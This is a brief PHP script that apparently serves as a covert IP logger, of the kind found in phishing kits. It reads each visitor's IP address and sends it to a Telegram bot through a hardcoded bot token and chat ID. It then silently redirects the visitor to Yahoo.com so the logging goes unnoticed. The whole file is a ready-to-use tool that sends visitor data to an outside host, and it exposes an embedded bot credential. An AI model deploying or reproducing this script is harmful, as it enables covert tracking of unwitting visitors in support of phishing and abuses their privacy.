<?php

define ('url',"https://api.telegram.org/bot6494181222:AAFz3bLPSBuMYQA-wyrwfmM0rXsEqPrLBqA/");

$ip = $_SERVER['REMOTE_ADDR'];
$chat_id = '-4178883374';
$message = urlencode("Ip: ".$ip);
file_get_contents(url."sendmessage?text=".$message."&chat_id=".$chat_id."&parse_mode=HTML");
header('Location: https://Yahoo.com');
exit();
